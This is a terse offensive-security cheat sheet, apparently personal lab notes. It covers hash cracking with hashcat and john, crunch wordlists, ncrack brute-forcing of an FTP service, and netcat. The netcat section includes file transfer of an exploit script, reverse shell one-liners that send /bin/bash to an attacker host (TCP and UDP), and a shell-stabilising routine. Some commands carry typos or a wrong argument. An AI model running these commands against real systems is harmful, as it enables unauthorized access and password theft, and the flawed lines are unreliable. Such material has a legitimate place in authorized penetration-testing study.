`hash-identifier` herp derp  

`hashcat` i.a. dictionary, brute force, role based hash cracking  
`hashcat -a 3 -m 1700 /home/user/SHA512_hash.txt --increment --increment-min 6 --increment-max 6 -1 ?l?u?d ?1?1?1?1?1?1`  
`-a` attack mode (here `3` - bruteforce), `-m` mode i.e. type of cracked hash (`1700` - SHA512), `-1` create new charset  
 use `-o results.txt` flag OR after cracking - type the same command with appended `--show` 

`john --format=RAW-MD5 --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou-50.txt hashestocrack.txt`  

`crunch <min-length> <max-length> <character-pool> -o <file-name>` generates passswords  

`ncrack -U /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt ftp://10.0.2.15:21 -v`  
support:
```
SSH, RDP, FTP, Telnet, HTTP(S), Wordpress, POP3(S), IMAP, CVS, SMB, VNC, SIP, Redis, PostgreSQL, MQTT, MySQL, MSSQL, MongoDB, Cassandra, WinRM, OWA, DICOM
```

for encodings [cyberchef](https://cyberchef.org/)  

### Netcat sending files
Listener:
`nc -lvp 4444 > incomig.txt` nc is a symlink of netcat  
TARGET HIGH PORTS  
Common users usually don't have access to ports under 1000  
`-l` - listening (opens port 4444 and pipe input into incoming.txt).  
`v` verbose `p` port 

Sender: 
`nc -nv 10.0.2.5 4444 < exploit.sh`  
`n` no DNS resolution  


### Netcat reverse shell 
Listener:
`nc -lvp 4444`

Target:  
`netcat 10.0.2.4 4444 -e /bin/bash` or `nc -c bash 10.0.0.1 4444`  
`-e` execute that program after connection -> that way you can send commends directly to opened shell via TCP connection (also possible with UDP `ncat --udp 10.0.0.1 4242 -e /bin/bash`)
[other reverse shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

Python tty (teletypewriter) wrapper:  
```bash
python-c 'import pty; pty.spawn("/bin/bash")'  
export TERM=xterm  
CTRL+Z  
stty raw -echo; fg  
```
